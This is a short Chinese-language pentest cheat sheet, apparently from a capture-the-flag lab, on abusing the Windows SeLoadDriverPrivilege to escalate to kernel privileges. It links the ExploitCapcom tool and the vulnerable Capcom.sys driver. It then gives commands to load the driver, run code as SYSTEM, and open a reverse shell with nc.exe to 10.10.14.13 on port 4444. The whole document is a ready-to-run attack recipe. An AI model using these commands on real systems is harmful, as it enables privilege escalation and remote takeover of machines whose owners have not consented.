# SeLoadDrivverPrivilege

允许用户加载内核驱动程序并以内核权限执行代码

```clike
1. 下载：（或者在我本机poc里SeLoadDrivverPrivilege这个文件夹）
ExploitCapcom.exe：
https://link.zhihu.com/?target=https%3A//github.com/clubby789/ExploitCapcom/releases/download/1.0/ExploitCapcom.exe

Capcom.sys：
https://github.com/FuzzySecurity/Capcom-Rootkit

2. 执行
.\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys .\ExploitCapcom.exe EXPLOIT whoami

3. 验证
.\ExploitCapcom.exe EXPLOIT whoami
5. 反弹shell
.\ExploitCapcom.exe EXPLOIT "C:\Users\svc-print\Documents\nc.exe 10.10.14.13 4444 -e cmd.exe"
```
